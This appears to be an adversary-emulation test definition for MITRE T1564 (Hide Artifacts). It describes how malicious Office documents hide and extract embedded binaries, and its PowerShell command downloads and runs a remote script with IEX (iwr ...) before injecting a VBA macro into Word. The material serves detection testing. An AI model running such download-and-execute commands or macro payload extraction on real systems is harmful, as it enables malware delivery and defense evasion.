- description: "This module extracts a binary (calc.exe) from inside of another binary.\
    \ \n\nIn the wild maldoc authors will use this technique to hide binaries inside\
    \ of files stored \nwithin the office document itself. An example of this technique\
    \ can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\
    \nThis sample contains a document inside of itself. Document 1 is the actual maldoc\
    \ itself, document 2\nis the same document without all the malicious code. Document\
    \ 1 will copy Document 2 to the file system\nand then \"peek\" inside of this\
    \ document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin\
    \ file is a payload that is parsed out and executed on the file system.\n"
  id: a0062ab5c86bcb7948b921eed2a83e9a
  name: Extract binary files via VBA
  platforms:
    windows:
      psh:
        cleanup: Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
        command: $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt");
          $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin";
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1");
          Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
        payloads: []
  tactic: defense-evasion
  technique:
    attack_id: T1564
    name: Hide Artifacts
